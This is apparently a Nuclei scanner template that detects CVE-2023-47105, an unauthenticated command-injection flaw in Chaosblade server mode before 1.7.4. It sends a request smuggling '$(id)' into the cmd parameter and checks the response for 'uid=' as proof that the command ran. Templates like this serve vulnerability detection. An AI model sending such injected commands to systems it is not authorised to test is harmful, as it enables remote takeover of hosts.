http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"uid=", "code", "success\":false", "error")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /chaosblade?cmd=$(id) HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-47105
info:
  author: s4e-io
  classification:
    cve-id: CVE-2023-47105
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L
    cvss-score: 8.6
    cwe-id: CWE-78
    epss-percentile: 0.95269
    epss-score: 0.19961
  description: 'exec.CommandContext in Chaosblade 0.3 through 1.7.3, when server mode
    is used, allows OS command execution via the cmd parameter without authentication.

    '
  impact: 'This vulnerability allows unauthenticated attackers to remotely invoke
    the HTTP service and execute arbitrary commands on any Chaosblade instance with
    server mode enabled. This could lead to unauthorized access and control over the
    host system running Chaosblade.

    '
  metadata:
    max-request: 1
    product: chaosblade
    vendor: chaosblade-io
    verified: true
  name: Chaosblade < 1.7.4 - Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-47105
  - https://github.com/advisories/GHSA-723h-x37g-f8qm
  - https://github.com/chaosblade-io/chaosblade/blob/0a07380c9899febb2b544132783b376b44226cca/exec/os/executor.go#L68
  - https://narrow-oatmeal-0c0.notion.site/ChaosBlade-Remote-Command-Execution-CVE-2023-47105-4f5459046488436caaec2bced6ff26d7
  remediation: Fixed in 1.7.4
  severity: high
  tags: cve,cve2023,chaosblade,rce,vkev,vuln
